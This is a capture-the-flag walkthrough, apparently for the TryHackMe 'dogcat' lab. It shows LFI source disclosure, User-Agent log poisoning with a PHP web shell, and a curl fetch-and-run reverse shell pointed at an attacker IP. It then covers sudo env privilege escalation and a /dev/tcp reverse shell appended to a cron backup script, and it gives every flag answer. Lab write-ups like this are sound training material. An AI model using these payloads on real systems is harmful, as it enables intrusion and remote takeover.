
# What is flag 1?

<details>
<summary><b>Answer</b></summary>
<b>THM{Th1s_1s_N0t_4_Catdog_ab67edfa}</b>
</details>

- Started `rustscan` for initial enumeration and found two ports running.

- On the web-page found a LFI in the `view` parameter. 

**Note - You can see `inclued_path` in the error** 

![screenshot](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/40.png)

- Tried accessing `index.php`, but we need to use `cat` or `dog` in the URL or else it will throw an error.

```shell
❯ curl http://10.10.207.105/\?view\=../index.php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Sorry, only dogs or cats are allowed.    </div>
</body>

</html>
```

- Tried accessing with `php-filter`

```shell
❯ curl http://10.10.207.105/\?view\=php://filter/convert.base64-encode/resource\=./dog/../index
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==    </div>
</body>

</html>
❯ echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==" | base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

- We can end use our own extension with `;ext=`, this will set variable `ext` to empty string.

```shell
❯ curl http://10.10.207.105/\?view\=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log\&ext=
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!<br />
<b>Warning</b>:  include(): unable to locate filter &quot;resource=.&quot; in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(): Unable to create filter (resource=.) in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(): unable to locate filter &quot;dog&quot; in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<b>Warning</b>:  include(): Unable to create filter (dog) in <b>/var/www/html/index.php</b> on line <b>24</b><br />
<br />
<----------------------------------snip------------------------>
view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log HTTP/1.1" 200 1081 "-" "curl/7.85.0"
10.17.0.215 - - [21/Dec/2022:12:21:35 +0000] "GET /?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext= HTTP/1.1" 200 21472 "-" "curl/7.85.0"
    </div>
</body>

</html>
```

- Changed User-Agent to `<?php system($_GET['cmd']) ?>` , to check for Log Poisoning with `burpsuite`.

![screenshot](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/41.png)

- Added `cmd` parameter to the URL with OS command.

![screenshot](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/42.png)

- Next made a `shell.sh` with `bash` payload for reverse shell, gave it executing rights, and executed it. Sample code is given below (URL encode it).

```shell
curl http://{ATTACKER IP}/shell.sh -o /tmp/shell.sh && chmod +x /tmp/shell.sh && bash -i /tmp/shell.sh
```

- Start python server to host `shell.sh` and `nc` listener (I use `pwncat`) 

- Send the request, got a shell back.

```shell
❯ pwncat-cs
[21:08:16] Welcome to pwncat 🐈!                                     __main__.py:164
(local) pwncat$ listen -m linux 4444
[21:08:28] new listener created for 0.0.0.0:4444                      manager.py:957
[21:10:33] 10.10.207.105:59120: registered new host w/ db             manager.py:957
[21:10:36] listener: 0.0.0.0:4444: linux session from                 manager.py:957
           10.10.207.105:59120 established                                          
(local) pwncat$                                                                                                                                                                        
(remote) www-data@e87f8f11e995:/var/www/html$ whoami
www-data
```

- Found the flag.

```shell
(remote) www-data@e87f8f11e995:/var/www/html$ ls
cat.php  cats  dog.php	dogs  flag.php	index.php  style.css
(remote) www-data@e87f8f11e995:/var/www/html$ cat flag.php 
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```


# What is flag 2?

<details>
<summary><b>Answer</b></summary>
<b>THM{LF1_t0_RC3_aec3fb}</b>
</details>

```shell
(remote) www-data@e87f8f11e995:/var/www/html$ cd ..
(remote) www-data@e87f8f11e995:/var/www$ ls
flag2_QMW7JvaY2LvK.txt	html
(remote) www-data@e87f8f11e995:/var/www$ cat flag2_QMW7JvaY2LvK.txt 
THM{LF1_t0_RC3_aec3fb}
```


# What is flag 3?

<details>
<summary><b>Answer</b></summary>
<b>THM{D1ff3r3nt_3nv1ronments_874112}</b>
</details>

- Checked commands that `www-data` can run as root.
- Found `/usr/bin/env` can be executed as root.

```shell
(remote) www-data@e87f8f11e995:/opt/backups$ sudo -l
Matching Defaults entries for www-data on e87f8f11e995:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on e87f8f11e995:
    (root) NOPASSWD: /usr/bin/env
```

- Got a root shell

```shell
(remote) www-data@e87f8f11e995:/opt/backups$ sudo -u root /usr/bin/env /bin/bash -p 
root@e87f8f11e995:/opt/backups# 
```


# What is flag 4?

<details>
<summary><b>Answer</b></summary>
<b>THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}</b>
</details>

- Found `backup.sh` in `/opt/backups` , which is readable and writable.
- Added our own reverse shell code to`/opt/backups/backup.sh` 

```shell
(remote) root@e87f8f11e995:/opt/backups# echo "bash -i >& /dev/tcp/10.17.0.215/4445 0>&1" >> backup.sh
(remote) root@e87f8f11e995:/opt/backups# cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
bash -i >& /dev/tcp/10.17.0.215/4445 0>&1
```

- After few seconds got back a shell

```shell
[21:35:45] 10.10.207.105:54496: normalizing shell path                                                                                                                   manager.py:957
[21:35:47] 10.10.207.105:54496: registered new host w/ db                                                                                                                manager.py:957
[21:35:50] listener: 0.0.0.0:4445: linux session from 10.10.207.105:54496 established 
```

- Found `flag4.txt`.

```console
(local) pwncat$ sessions 1
[21:38:56] targeting session-1 (10.10.207.105:54496)                                                                                                                     sessions.py:88
(local) pwncat$                                                                                                                                                                        
(remote) root@dogcat:/root# ls
container  flag4.txt
(remote) root@dogcat:/root# cat flag4.txt 
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
(remote) root@dogcat:/root# 
```